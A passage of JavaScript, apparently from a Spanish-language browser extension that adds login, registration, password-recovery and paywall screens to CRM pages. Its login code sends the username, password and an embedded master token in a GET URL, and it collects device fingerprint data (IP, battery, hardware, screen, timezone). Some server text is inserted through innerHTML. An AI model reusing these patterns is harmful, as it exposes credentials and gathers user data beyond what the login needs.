                    padding: '10px 20px', color: '#e2e8f0', cursor: 'pointer',
                    fontSize: '15px', fontWeight: 'bold', display: 'flex', alignItems: 'center', gap: '10px',
                    transition: 'background 0.2s'
                });
                optDiv.innerHTML = `<img src="${item.img}" style="width: 24px; border-radius: 4px;"> <span>${item.name}</span>`;

                optDiv.onmouseenter = () => { optDiv.style.backgroundColor = 'rgba(56, 189, 248, 0.2)'; optDiv.style.color = '#38bdf8'; };
                optDiv.onmouseleave = () => { optDiv.style.backgroundColor = 'transparent'; optDiv.style.color = '#e2e8f0'; };

                optDiv.onclick = (e) => {
                    e.stopPropagation();
                    selectedContent.innerHTML = `<img src="${item.img}" style="width: 24px; border-radius: 4px;"> <span style="font-weight: bold;">${item.name}</span>`;
                    hiddenCountryInput.value = item.code;
                    optionsContainer.style.display = 'none';
                    arrowIcon.style.transform = 'rotate(0deg)';
                    customSelect.style.borderColor = 'rgba(255,255,255,0.4)';
                };
                optionsContainer.appendChild(optDiv);
            });

            customSelect.onclick = (e) => {
                e.stopPropagation();
                const isOpen = optionsContainer.style.display === 'flex';
                optionsContainer.style.display = isOpen ? 'none' : 'flex';
                arrowIcon.style.transform = isOpen ? 'rotate(0deg)' : 'rotate(180deg)';
                customSelect.style.borderColor = isOpen ? '#38bdf8' : 'rgba(255,255,255,0.4)';
            };

            document.addEventListener('click', () => {
                optionsContainer.style.display = 'none';
                arrowIcon.style.transform = 'rotate(0deg)';
                customSelect.style.borderColor = 'rgba(255,255,255,0.4)';
            });

            countryWrap.append(customSelect, optionsContainer);
            // 👆 FIN LÓGICA DESPLEGABLE GLASSMORPHISM 👆

            box.querySelector('#btn-cancel-register').onclick = () => subOverlay.remove();

            // 🔥 FORZAR FORMATOS EN VIVO (MODAL REGISTRO) 🔥
            box.querySelector('#reg-user').addEventListener('input', function() { this.value = this.value.toUpperCase().replace(/\s+/g, ''); }); 
            box.querySelector('#reg-name').addEventListener('input', function() { this.value = this.value.toUpperCase(); }); 
            box.querySelector('#reg-email').addEventListener('input', function() { this.value = this.value.toLowerCase().replace(/\s+/g, ''); }); 
            box.querySelector('#reg-pass').addEventListener('input', function() { this.value = this.value.replace(/\s+/g, ''); }); 
            
            // 🔥 VALIDACIÓN DINÁMICA DEL SERVIDOR 🔥
            const regServerInput = box.querySelector('#reg-server');
            regServerInput.addEventListener('input', function() {
                const val = this.value.toLowerCase().replace(/\s+/g, '');
                this.value = val;
                if (val === '') {
                    this.style.borderColor = 'rgba(255,255,255,0.4)';
                    this.style.boxShadow = 'none';
                } else if (SERVERS_DB[val]) {
                    this.style.borderColor = '#34d399'; // Verde neón
                    this.style.boxShadow = '0 0 10px rgba(52, 211, 153, 0.5)';
                } else {
                    this.style.borderColor = '#ef4444'; // Rojo peligro
                    this.style.boxShadow = '0 0 10px rgba(239, 68, 68, 0.5)';
                }
            });

            box.querySelector('#reg-pass-repeat').addEventListener('input', function() { this.value = this.value.replace(/\s+/g, ''); });

            // 🔥 LÓGICA DINÁMICA DE LA CONTRASEÑA (VER/OCULTAR + REPETIR) 🔥
            const regPassInput = box.querySelector('#reg-pass');
            const regPassRepeat = box.querySelector('#reg-pass-repeat');
            const regPassEye = box.querySelector('#reg-pass-eye');
            
            regPassEye.onclick = () => {
                if (regPassInput.type === 'password') {
                    // Contraseña visible: no hay necesidad de repetir
                    regPassInput.type = 'text';
                    regPassEye.innerText = '🙈';
                    regPassRepeat.style.display = 'none';
                    regPassRepeat.value = '';
                } else {
                    // Contraseña oculta: exigir repetir
                    regPassInput.type = 'password';
                    regPassEye.innerText = '👁️';
                    regPassRepeat.style.display = 'block';
                }
            };

            box.querySelector('#btn-do-register').onclick = () => {
                const u = box.querySelector('#reg-user').value.trim(); 
                const n = box.querySelector('#reg-name').value.trim();
                const e = box.querySelector('#reg-email').value.trim(); 
                const p = box.querySelector('#reg-pass').value.trim();
                const p2 = box.querySelector('#reg-pass-repeat').value.trim();
                const serverVal = box.querySelector('#reg-server').value.toLowerCase().replace(/\s+/g, '');
                const country = box.querySelector('#reg-country').value; 
                const m = box.querySelector('#reg-msg');

                const isHidden = regPassInput.type === 'password';

                if(!u || !n || !e || !p || !serverVal || (isHidden && !p2)) { 
                    m.innerText = '⚠️ Llena todos los campos requeridos'; 
                    m.style.color = '#fbbf24'; 
                    return; 
                }
                
                if (isHidden && p !== p2) {
                    m.innerText = '⚠️ Las contraseñas no coinciden'; 
                    m.style.color = '#ef4444'; 
                    regPassRepeat.style.borderColor = '#ef4444';
                    setTimeout(() => regPassRepeat.style.borderColor = 'rgba(255,255,255,0.4)', 2000);
                    return;
                }
                if(!SERVERS_DB[serverVal]) { m.innerText = '⚠️ El servidor ingresado no es válido'; m.style.color = '#ef4444'; return; }

                m.innerText = '⏳ Registrando en el servidor...'; m.style.color = '#fff';
                box.querySelector('#btn-do-register').disabled = true;

                // 🤖 LÓGICA DE ASIGNACIÓN DE DIVISAS POR DEFECTO OCULTA EN EL CÓDIGO
                let defMonto = "25";
                let defMoneda = "Bs.";
                
                if (country === 'CO') { defMonto = "4"; defMoneda = "USDT"; } 
                else if (country === 'VE') { defMonto = "3"; defMoneda = "USDT"; }
                else if (country === 'OT') { defMonto = "4"; defMoneda = "USDT"; }

                const payload = { 
                    token: MASTER_TOKEN, action: 'registrar_usuario', 
                    usuario: u, nombre: n, correo: e, pass: p, 
                    monto: defMonto, moneda: defMoneda, servidor: serverVal 
                };
                
                // 1. FORZAMOS A USAR EL SERVIDOR ESCRITO EN EL MODAL DE REGISTRO
                const dynamicApiUrl = SERVERS_DB[serverVal].script;
                
                // 2. HACEMOS FETCH A LA URL DINÁMICA
                safeSendMessage({ action: 'proxy_fetch', url: dynamicApiUrl, options: { method: 'POST', body: JSON.stringify(payload) } }, res => {
                    if(res && res.success && res.data && res.data.success) {
                        m.innerText = '✅ ' + res.data.message; m.style.color = '#34d399';
                        setTimeout(() => { 
                            subOverlay.remove(); 
                            userInput.inp.value = u; 
                            passInput.inp.value = p; 
                            
                            // 3. SINCRONIZAMOS EL LOGIN PRINCIPAL CON EL NUEVO SERVIDOR
                            serverInput.inp.value = serverVal;
                            serverInput.inp.dispatchEvent(new Event('input'));
                        }, 4000);
                    } else {
                        m.innerText = '❌ ' + (res?.data?.message || 'Error al registrar'); m.style.color = '#ef4444';
                        box.querySelector('#btn-do-register').disabled = false;
                    }
                });
            };
        };
        linkRecover.onclick = () => {
            const { subOverlay, box } = crearSubModal('🔐 Recuperar Clave', `
                <p style="color: #cbd5e1; font-size: 13px; text-align: center; margin-top: 0;">Ingresa tu usuario para recibir un PIN en tu correo.</p>
                <input type="text" id="rec-user" placeholder="Tu Usuario " class="crm-login-input" style="width: 100%; padding: 12px 20px; border-radius: 50px; border: 2px solid rgba(255,255,255,0.4); background: rgba(255,255,255,0.1); color: white; outline: none; box-sizing: border-box; margin-bottom: 10px;">
                
                <!-- 🔥 NUEVO: INPUT SERVIDOR COMO ÚLTIMA OPCIÓN 🔥 -->
                <input type="text" id="rec-server" placeholder="Servidor" class="crm-login-input" style="width: 100%; padding: 12px 20px; border-radius: 50px; border: 2px solid rgba(255,255,255,0.4); background: rgba(255,255,255,0.1); color: white; outline: none; box-sizing: border-box; transition: border-color 0.3s, box-shadow 0.3s;">

                <button id="btn-req-pin" style="width: 100%; padding: 15px; border-radius: 50px; border: none; background: #00b4ff; color: #fff; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px;">ENVIAR PIN</button>
                <button id="btn-cancel-rec" style="width: 100%; padding: 10px; border-radius: 50px; border: 1px solid #64748b; background: transparent; color: #94a3b8; font-weight: bold; cursor: pointer; margin-top: 10px;">Volver</button>
                <div id="rec-msg" style="text-align: center; font-size: 13px; font-weight: bold; min-height: 20px; margin-top: 10px;"></div>
                
                <div id="step-2" style="display: none; flex-direction: column; gap: 10px; margin-top: 15px; border-top: 1px solid rgba(255,255,255,0.1); padding-top: 15px;">
                    <input type="text" id="rec-pin" placeholder="Código PIN de 6 dígitos" class="crm-login-input" style="width: 100%; padding: 12px 20px; border-radius: 50px; border: 2px solid #3b82f6; background: rgba(59, 130, 246, 0.1); color: white; text-align: center; font-size: 18px; letter-spacing: 2px; outline: none; box-sizing: border-box;">
                    
                    <div style="position: relative; width: 100%;">
                        <input type="password" id="rec-new-pass" placeholder="Nueva Contraseña" class="crm-login-input" style="width: 100%; padding: 12px 50px 12px 20px; border-radius: 50px; border: 2px solid rgba(255,255,255,0.4); background: rgba(255,255,255,0.1); color: white; outline: none; box-sizing: border-box;">
                        <span id="rec-pass-eye" style="position: absolute; right: 20px; top: 50%; transform: translateY(-50%); color: #fff; font-size: 20px; cursor: pointer; opacity: 0.9; user-select: none; z-index: 10;">👁️</span>
                    </div>
                    <input type="password" id="rec-new-pass-repeat" placeholder="Repetir Nueva Contraseña" class="crm-login-input" style="width: 100%; padding: 12px 20px; border-radius: 50px; border: 2px solid rgba(255,255,255,0.4); background: rgba(255,255,255,0.1); color: white; outline: none; box-sizing: border-box; transition: 0.3s;">

                    <button id="btn-save-pass" style="width: 100%; padding: 15px; border-radius: 50px; border: none; background: #10b981; color: #fff; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 5px;">GUARDAR CONTRASEÑA</button>
                </div>
            `);

            box.querySelector('#btn-cancel-rec').onclick = () => subOverlay.remove();

            // 🔥 FORZAR FORMATOS EN VIVO 🔥
            box.querySelector('#rec-user').addEventListener('input', function() { this.value = this.value.toUpperCase().replace(/\s+/g, ''); });
            box.querySelector('#rec-pin').addEventListener('input', function() { this.value = this.value.replace(/\s+/g, ''); });
            box.querySelector('#rec-new-pass').addEventListener('input', function() { this.value = this.value.replace(/\s+/g, ''); });
            box.querySelector('#rec-new-pass-repeat').addEventListener('input', function() { this.value = this.value.replace(/\s+/g, ''); });

            // 🔥 LÓGICA DEL SERVIDOR (Auto-llenado y Validación Visual) 🔥
            const recServerInput = box.querySelector('#rec-server');
            recServerInput.addEventListener('input', function() {
                const val = this.value.toLowerCase().replace(/\s+/g, '');
                this.value = val;
                if (val === '') {
                    this.style.borderColor = 'rgba(255,255,255,0.4)'; this.style.boxShadow = 'none';
                } else if (SERVERS_DB[val]) {
                    this.style.borderColor = '#34d399'; this.style.boxShadow = '0 0 10px rgba(52, 211, 153, 0.5)';
                } else {
                    this.style.borderColor = '#ef4444'; this.style.boxShadow = '0 0 10px rgba(239, 68, 68, 0.5)';
                }
            });

            // Auto-llenado si ya hay uno guardado
            const curSubRec = localStorage.getItem('serverSubdomain');
            if (curSubRec) {
                recServerInput.value = curSubRec;
                recServerInput.dispatchEvent(new Event('input'));
            }

            // 🔥 LÓGICA DINÁMICA DEL OJITO 🔥
            const recPassInput = box.querySelector('#rec-new-pass');
            const recPassRepeat = box.querySelector('#rec-new-pass-repeat');
            const recPassEye = box.querySelector('#rec-pass-eye');
            
            recPassEye.onclick = () => {
                if (recPassInput.type === 'password') {
                    recPassInput.type = 'text';
                    recPassEye.innerText = '🙈';
                    recPassRepeat.style.display = 'none';
                    recPassRepeat.value = '';
                } else {
                    recPassInput.type = 'password';
                    recPassEye.innerText = '👁️';
                    recPassRepeat.style.display = 'block';
                }
            };

            box.querySelector('#btn-req-pin').onclick = () => {
                const u = box.querySelector('#rec-user').value.trim();
                const srv = recServerInput.value.trim();
                const m = box.querySelector('#rec-msg');

                if(!u || !srv) { m.innerText = '⚠️ Ingresa tu usuario y servidor'; m.style.color = '#fbbf24'; return; }
                if(!SERVERS_DB[srv]) { m.innerText = '⚠️ Servidor no válido'; m.style.color = '#ef4444'; return; }
                
                m.innerText = '⏳ Buscando usuario y procesando...'; m.style.color = '#fff';
                box.querySelector('#btn-req-pin').disabled = true;

                const dynamicApiUrl = SERVERS_DB[srv].script; // API Dinámica según el servidor escrito
                const payload = { token: MASTER_TOKEN, action: 'solicitar_recuperacion', usuario: u };
                
                safeSendMessage({ action: 'proxy_fetch', url: dynamicApiUrl, options: { method: 'POST', body: JSON.stringify(payload) } }, res => {
                    box.querySelector('#btn-req-pin').disabled = false; 
                    
                    if (res && res.success && res.data) {
                        if (res.data.success) {
                            m.innerText = '✅ ' + res.data.message; 
                            m.style.color = '#34d399';
                            box.querySelector('#btn-req-pin').style.display = 'none';
                            box.querySelector('#rec-user').disabled = true;
                            recServerInput.disabled = true; // Bloquea el servidor para el paso 2
                            box.querySelector('#step-2').style.display = 'flex';
                        } else {
                            m.innerText = '❌ ' + (res.data.message || 'Error al enviar'); 
                            m.style.color = '#ef4444';
                        }
                    } else {
                        m.innerText = '❌ Error de comunicación con el servidor.'; 
                        m.style.color = '#ef4444';
                    }
                });
            };

            box.querySelector('#btn-save-pass').onclick = () => {
                const u = box.querySelector('#rec-user').value.trim();
                const srv = recServerInput.value.trim();
                const pin = box.querySelector('#rec-pin').value.trim();
                const np = box.querySelector('#rec-new-pass').value.trim();
                const np2 = box.querySelector('#rec-new-pass-repeat').value.trim();
                const m = box.querySelector('#rec-msg');

                const isHidden = recPassInput.type === 'password';

                if(!pin || !np || (isHidden && !np2)) { 
                    m.innerText = '⚠️ Ingresa el PIN y las contraseñas'; 
                    m.style.color = '#fbbf24'; 
                    return; 
                }
                
                if(isHidden && np !== np2) { 
                    m.innerText = '⚠️ Las contraseñas no coinciden'; 
                    m.style.color = '#ef4444'; 
                    recPassRepeat.style.borderColor = '#ef4444';
                    setTimeout(() => recPassRepeat.style.borderColor = 'rgba(255,255,255,0.4)', 2000);
                    return; 
                }

                m.innerText = '⏳ Actualizando...'; m.style.color = '#fff';
                box.querySelector('#btn-save-pass').disabled = true;

                const dynamicApiUrl = SERVERS_DB[srv].script; // API Dinámica
                const payload = { token: MASTER_TOKEN, action: 'cambiar_password', usuario: u, pin: pin, nuevaPass: np };
                
                safeSendMessage({ action: 'proxy_fetch', url: dynamicApiUrl, options: { method: 'POST', body: JSON.stringify(payload) } }, res => {
                    if(res && res.success && res.data && res.data.success) {
                        m.innerText = '✅ ' + res.data.message; m.style.color = '#34d399';
                        setTimeout(() => { 
                            subOverlay.remove(); 
                            userInput.inp.value = u; 
                            passInput.inp.value = np; 
                            // Sincronizar el servidor global si lo escribió diferente
                            serverInput.inp.value = srv;
                            serverInput.inp.dispatchEvent(new Event('input'));
                        }, 3000);
                    } else {
                        m.innerText = '❌ ' + (res?.data?.message || 'Error al actualizar'); m.style.color = '#ef4444';
                        box.querySelector('#btn-save-pass').disabled = false;
                    }
                });
            };
        };

        linkChangePass.onclick = () => {
            const { subOverlay, box } = crearSubModal('🔄 Cambiar Contraseña', `
                <p style="color: #cbd5e1; font-size: 13px; text-align: center; margin-top: 0;">Ingresa tu contraseña actual y la nueva.</p>
                <input type="text" id="chg-user" placeholder="Usuario " class="crm-login-input" style="width: 100%; padding: 12px 20px; border-radius: 50px; border: 2px solid rgba(255,255,255,0.4); background: rgba(255,255,255,0.1); color: white; outline: none; box-sizing: border-box; margin-bottom: 10px;">
                
                <div style="position: relative; width: 100%; margin-bottom: 10px;">
                    <input type="password" id="chg-old-pass" placeholder="Contraseña Actual" class="crm-login-input" style="width: 100%; padding: 12px 50px 12px 20px; border-radius: 50px; border: 2px solid rgba(255,255,255,0.4); background: rgba(255,255,255,0.1); color: white; outline: none; box-sizing: border-box;">
                    <span id="chg-old-pass-eye" style="position: absolute; right: 20px; top: 50%; transform: translateY(-50%); color: #fff; font-size: 20px; cursor: pointer; opacity: 0.9; user-select: none; z-index: 10;">👁️</span>
                </div>
                
                <div style="position: relative; width: 100%; margin-bottom: 10px;">
                    <input type="password" id="chg-new-pass" placeholder="Nueva Contraseña" class="crm-login-input" style="width: 100%; padding: 12px 50px 12px 20px; border-radius: 50px; border: 2px solid #3b82f6; background: rgba(59, 130, 246, 0.1); color: white; outline: none; box-sizing: border-box;">
                    <span id="chg-pass-eye" style="position: absolute; right: 20px; top: 50%; transform: translateY(-50%); color: #fff; font-size: 20px; cursor: pointer; opacity: 0.9; user-select: none; z-index: 10;">👁️</span>
                </div>
                
                <input type="password" id="chg-new-pass-repeat" placeholder="Repetir Nueva Contraseña" class="crm-login-input" style="width: 100%; padding: 12px 20px; border-radius: 50px; border: 2px solid #3b82f6; background: rgba(59, 130, 246, 0.1); color: white; outline: none; box-sizing: border-box; transition: 0.3s; margin-bottom: 10px;">
                
                <!-- 🔥 NUEVO: INPUT SERVIDOR COMO ÚLTIMA OPCIÓN 🔥 -->
                <input type="text" id="chg-server" placeholder="Servidor" class="crm-login-input" style="width: 100%; padding: 12px 20px; border-radius: 50px; border: 2px solid rgba(255,255,255,0.4); background: rgba(255,255,255,0.1); color: white; outline: none; box-sizing: border-box; transition: border-color 0.3s, box-shadow 0.3s;">

                <button id="btn-do-change-pass" style="width: 100%; padding: 15px; border-radius: 50px; border: none; background: #38bdf8; color: #000; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; box-shadow: 0 4px 15px rgba(56, 189, 248, 0.4);">ACTUALIZAR CONTRASEÑA</button>
                <button id="btn-cancel-change" style="width: 100%; padding: 10px; border-radius: 50px; border: 1px solid #64748b; background: transparent; color: #94a3b8; font-weight: bold; cursor: pointer; margin-top: 10px;">Volver</button>
                <div id="chg-msg" style="text-align: center; font-size: 13px; font-weight: bold; min-height: 20px; margin-top: 10px;"></div>
            `);

            box.querySelector('#btn-cancel-change').onclick = () => subOverlay.remove();

            box.querySelector('#chg-user').addEventListener('input', function() { this.value = this.value.toUpperCase().replace(/\s+/g, ''); });
            box.querySelector('#chg-old-pass').addEventListener('input', function() { this.value = this.value.replace(/\s+/g, ''); });
            box.querySelector('#chg-new-pass').addEventListener('input', function() { this.value = this.value.replace(/\s+/g, ''); });
            box.querySelector('#chg-new-pass-repeat').addEventListener('input', function() { this.value = this.value.replace(/\s+/g, ''); });

            // 🔥 LÓGICA DEL SERVIDOR (Auto-llenado y Validación Visual) 🔥
            const chgServerInput = box.querySelector('#chg-server');
            chgServerInput.addEventListener('input', function() {
                const val = this.value.toLowerCase().replace(/\s+/g, '');
                this.value = val;
                if (val === '') {
                    this.style.borderColor = 'rgba(255,255,255,0.4)'; this.style.boxShadow = 'none';
                } else if (SERVERS_DB[val]) {
                    this.style.borderColor = '#34d399'; this.style.boxShadow = '0 0 10px rgba(52, 211, 153, 0.5)';
                } else {
                    this.style.borderColor = '#ef4444'; this.style.boxShadow = '0 0 10px rgba(239, 68, 68, 0.5)';
                }
            });

            // Auto-llenado
            const curSubChg = localStorage.getItem('serverSubdomain');
            if (curSubChg) {
                chgServerInput.value = curSubChg;
                chgServerInput.dispatchEvent(new Event('input'));
            }

            // 🔥 LÓGICA DINÁMICA DE LOS OJITOS 🔥
            const chgOldPass = box.querySelector('#chg-old-pass');
            const chgOldPassEye = box.querySelector('#chg-old-pass-eye');
            const chgNewPass = box.querySelector('#chg-new-pass');
            const chgNewPassRepeat = box.querySelector('#chg-new-pass-repeat');
            const chgPassEye = box.querySelector('#chg-pass-eye');

            chgOldPassEye.onclick = () => {
                if (chgOldPass.type === 'password') {
                    chgOldPass.type = 'text';
                    chgOldPassEye.innerText = '🙈';
                } else {
                    chgOldPass.type = 'password';
                    chgOldPassEye.innerText = '👁️';
                }
            };

            chgPassEye.onclick = () => {
                if (chgNewPass.type === 'password') {
                    chgNewPass.type = 'text';
                    chgPassEye.innerText = '🙈';
                    chgNewPassRepeat.style.display = 'none';
                    chgNewPassRepeat.value = '';
                } else {
                    chgNewPass.type = 'password';
                    chgPassEye.innerText = '👁️';
                    chgNewPassRepeat.style.display = 'block';
                }
            };

            box.querySelector('#btn-do-change-pass').onclick = () => {
                const u = box.querySelector('#chg-user').value.trim();
                const srv = chgServerInput.value.trim();
                const oldP = chgOldPass.value.trim();
                const newP = chgNewPass.value.trim();
                const newP2 = chgNewPassRepeat.value.trim();
                const m = box.querySelector('#chg-msg');

                const isHidden = chgNewPass.type === 'password';

                if(!u || !oldP || !newP || !srv || (isHidden && !newP2)) { 
                    m.innerText = '⚠️ Llena todos los campos requeridos'; 
                    m.style.color = '#fbbf24'; 
                    return; 
                }
                if(!SERVERS_DB[srv]) { m.innerText = '⚠️ Servidor no válido'; m.style.color = '#ef4444'; return; }
                
                if(isHidden && newP !== newP2) { 
                    m.innerText = '⚠️ Las contraseñas nuevas no coinciden'; 
                    m.style.color = '#ef4444'; 
                    chgNewPassRepeat.style.borderColor = '#ef4444';
                    setTimeout(() => chgNewPassRepeat.style.borderColor = '#3b82f6', 2000);
                    return; 
                }

                m.innerText = '⏳ Actualizando...'; m.style.color = '#fff';
                box.querySelector('#btn-do-change-pass').disabled = true;

                const dynamicApiUrl = SERVERS_DB[srv].script; // API Dinámica
                const payload = { token: MASTER_TOKEN, action: 'cambiar_password_conocida', usuario: u, passAntigua: oldP, nuevaPass: newP };
                
                safeSendMessage({ action: 'proxy_fetch', url: dynamicApiUrl, options: { method: 'POST', body: JSON.stringify(payload) } }, res => {
                    if(res && res.success && res.data && res.data.success) {
                        m.innerText = '✅ ' + res.data.message; m.style.color = '#34d399';
                        setTimeout(() => { 
                            subOverlay.remove(); 
                            userInput.inp.value = u; 
                            passInput.inp.value = newP;
                            // Sincronizar el servidor global
                            serverInput.inp.value = srv;
                            serverInput.inp.dispatchEvent(new Event('input'));
                        }, 3000);
                    } else {
                        m.innerText = '❌ ' + (res?.data?.message || 'Error al actualizar. Verifica tu contraseña actual.'); m.style.color = '#ef4444';
                        box.querySelector('#btn-do-change-pass').disabled = false;
                    }
                });
            };
        };
        // 👆 FIN BLOQUE NUEVO 👆

        const handleLogin = async () => {
            if (!isExtensionAlive) { msgBox.innerText = '⚠️ Recarga (F5)'; msgBox.style.color = '#ffd700'; return; }

            // Validación de servidor escrito
            const srvText = serverInput.inp.value.trim();
            if (!srvText) { msgBox.innerText = '⚠️ Escribe tu servidor arriba'; msgBox.style.color = '#fbbf24'; return; }
            if (!SERVERS_DB[srvText]) { 
                msgBox.innerText = '⚠️ El servidor escrito no existe'; 
                msgBox.style.color = '#ef4444'; 
                serverInput.inp.style.borderColor = '#ef4444';
                setTimeout(() => serverInput.inp.style.borderColor = 'rgba(255,255,255,0.4)', 2000);
                return; 
            }

            // Asignar variables dinámicas según lo escrito
            localStorage.setItem('serverSubdomain', srvText);
            CEREBRO_URL = SERVERS_DB[srvText].script;
            FIREBASE_URL = SERVERS_DB[srvText].firebase;
            API_URL = CEREBRO_URL;
            
            

            const u = userInput.inp.value.trim();
            const p = passInput.inp.value.trim();
            if (!u || !p) { msgBox.innerText = '⚠️ Ingrese credenciales'; msgBox.style.color = '#ffd700'; return; }

            if (!API_URL) { 
                msgBox.innerText = '🚨 Error Crítico: La ruta del servidor falló.'; 
                msgBox.style.color = '#ef4444'; 
                return; 
            }

            // 🔥 REGLA RESTAURADA: OBLIGAR A QUE EL DEVICE_ID TENGA EL NOMBRE DEL USUARIO
            let deviceUniqueId = localStorage.getItem('deviceUniqueId');
            const cleanUser = u.replace(/[^a-zA-Z0-9]/g, '').toUpperCase(); 
            
            // Si el ID no existe o si es de los "viejos" que no tienen el nombre, lo regeneramos
            if (!deviceUniqueId || !deviceUniqueId.includes(cleanUser)) {
                const randomSuffix = Math.random().toString(36).substr(2, 5);
                deviceUniqueId = `dev_${cleanUser}_${randomSuffix}`;
                localStorage.setItem('deviceUniqueId', deviceUniqueId);
            }
            btnLogin.disabled = true; btnLogin.innerText = 'Ingresando..'; btnLogin.style.opacity = '0.7';
            
            const currentIP = await getPublicIP();
            const batteryData = await getBatteryStatus();
            const userAgentInfo = await getAdvancedBrowserInfo();
            const hardwareData = getHardwareInfo();
            const netData = navigator.connection ? navigator.connection.effectiveType : 'Desconocida';
            const screenInfo = `${window.screen.width}x${window.screen.height}`;
            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            const url = new URL(API_URL);
            url.searchParams.append('token', MASTER_TOKEN); // 🛡️ LLAVE MAESTRA
            url.searchParams.append('action', 'login');
            url.searchParams.append('usuario', u);
            url.searchParams.append('contrasena', p);
            // ... (el resto queda igual)
            url.searchParams.append('sessionId', sessionId);
            url.searchParams.append('deviceId', deviceUniqueId);
            url.searchParams.append('ip', currentIP);
            url.searchParams.append('crm', window.location.hostname);
            url.searchParams.append('userAgent', userAgentInfo);
            url.searchParams.append('screen', screenInfo);
            url.searchParams.append('battery', batteryData);
            url.searchParams.append('net', netData);
            url.searchParams.append('hardware', hardwareData);
            url.searchParams.append('timezone', timeZone);

            safeSendMessage({ action: 'proxy_fetch', url: url.toString(), options: { method: 'GET' } }, response => {
                const res = (response && response.success) ? response.data : { success: false, message: response?.error || 'Error de conexión' };
                
                if (res.forceUpdate) {
                    const isMacMsg = navigator.userAgent.toUpperCase().indexOf('MAC OS') >= 0 || (navigator.userAgentData && navigator.userAgentData.platform === 'macOS');
                    msgBox.innerText = `⚠️ ACTUALIZACIÓN REQUERIDA. USA ${isMacMsg ? '⌘' : 'CTRL'}+SHIFT+Z`; 
                    msgBox.style.color = '#fbbf24';
                    btnLogin.style.display = 'none';
                    btnRepair.style.display = 'block';
                    btnRepair.style.marginTop = '0';
                    btnRepair.style.width = '100%';
                    btnRepair.style.padding = '15px';
                    btnRepair.innerText = '🛠️ EJECUTAR LIMPIEZA OBLIGATORIA';
                    return; 
                }

                if (res.success) {
                    localStorage.setItem('usuarioLogueado', u);
                    localStorage.setItem('sessionId', sessionId);
                    localStorage.setItem('loginTimestamp', Date.now().toString());
                    localStorage.setItem('sessionLimit', res.limit);
                    localStorage.setItem('configRef', res.permisoRef || 'si'); 

                    const userRole = res.puesto ? ` ${res.puesto}` : ''; 
                    // Extraer y limpiar el nombre real
                    const realServerName = srvText.replace(/-/g, ' ').toUpperCase(); 
                    
                    // Inyectamos HTML para mostrar el nombre del servidor en azul brillante bajo el mensaje de éxito
                    msgBox.innerHTML = `✅ Acceso Autorizado${userRole}<br><span style="font-size:12px; color:#38bdf8;">Conectado a: ${realServerName}</span>`; 
                    msgBox.style.color = '#51cf66';
                    showNotification(`Bienvenido${userRole}: ${res.message}`, 3000, 'success');
                    
                    initAudioSystem();

                    setTimeout(() => { 
                        overlay.remove(); 
                        checkLogoutButton(); 
                        checkTimerWidget(); 
                        if (callback) callback(u); 
                        heartbeat(); // 🔥 LLAMADA INMEDIATA AL ENTRAR
                    }, 1000);

                } else {
                    btnLogin.disabled = false; btnLogin.innerText = 'INGRESAR'; btnLogin.style.opacity = '1';
                    
                    // 👇 INICIO INTERCEPCIÓN DE PAGO INTERNACIONAL Y ESTÉTICA 👇
                    if (res.impago) {
                        title.style.display = 'none';
                        serverInput.wrap.style.display = 'none'; 
                        userInput.wrap.style.display = 'none';
                        passInput.wrap.style.display = 'none';
                        btnLogin.style.display = 'none';
                        
                        // 🔥 OCULTAMOS LOS ENLACES PARA QUE NO ESTORBEN ARRIBA 🔥
                        extraLinksDiv.style.display = 'none'; 
                        
                        const btnRepairNode = document.getElementById('crm-hidden-repair-btn');
                        if(btnRepairNode) btnRepairNode.style.display = 'none';
                        
                        // Ajustar contenedor principal
                        formContainer.style.width = '100%';
                        formContainer.style.maxWidth = '1300px'; 
                        formContainer.style.padding = '10px'; 
                        
                        // 🔥 FIX CRÍTICO: LIBERAR LA BURBUJA DE SUS 350px DE LÍMITE 🔥
                        msgBox.style.maxWidth = 'none';
                        msgBox.style.width = '100%';
                        msgBox.style.border = 'none';
                        msgBox.style.backgroundColor = 'transparent';
                        msgBox.style.boxShadow = 'none';
                        msgBox.style.padding = '0'; 
                        
                        const montoPagar = res.monto || "25";
                        const monedaActiva = res.moneda || "Bs."; // 🌍 Variable de país
                        
                        // 🤖 LÓGICA DE PAÍSES
                        const esBolivia = monedaActiva.toLowerCase().includes('bs');
                        const esColombia = monedaActiva.toLowerCase().includes('cop') || window.location.href.includes('co-crm');

                        // Lógica de Moneda Principal (Fuerza USDT para Binance, ya sea Colombia o Extranjero normal)
                        let monedaPrincipal = monedaActiva;
                        if (esColombia || monedaActiva.toUpperCase() === 'USD') monedaPrincipal = "USDT";

                        // Selección de imagen QR de PAGO (El gigante de la derecha)
                        let imgQR = "https://i.postimg.cc/v82HTd1M/QRBINANCE.jpg"; // Default Extranjero (Binance)
                        let tituloQR = "BINANCE PAY (USDT)";
                        if (esBolivia) { 
                            imgQR = "https://i.postimg.cc/W1PMfWrC/QR.jpg"; // QR Local Bolivia
                            tituloQR = "PAGO QR LOCAL";
                            monedaPrincipal = monedaActiva; // Retorna a Bs.
                        }

                        // Componentes Reutilizables para el contacto de Telegram (Enlace completo + Botón Copiar)
                        const linkTelegramHtml = `
                            <div style="display: inline-flex; align-items: center; background: rgba(0,0,0,0.4); padding: 5px 12px; border-radius: 8px; border: 1px solid rgba(56, 189, 248, 0.4); width: fit-content; max-width: 100%;">
                                <a href="https://t.me/extensionesgral" target="_blank" style="color: #38bdf8; text-decoration: none; font-weight: bold; font-size: 13px; word-break: break-all;">https://t.me/extensionesgral</a>
                                <span onclick="navigator.clipboard.writeText('https://t.me/extensionesgral'); this.innerText='✅'; setTimeout(()=>this.innerText='📋', 1500);" style="cursor: pointer; background: transparent; border: none; padding: 0 0 0 10px; font-size: 16px; margin-left: 8px; border-left: 1px solid rgba(255,255,255,0.3);" title="Copiar enlace">📋</span>
                            </div>
                        `;

                        // QR Pequeño de Telegram (Con función clic para Pantalla Completa)
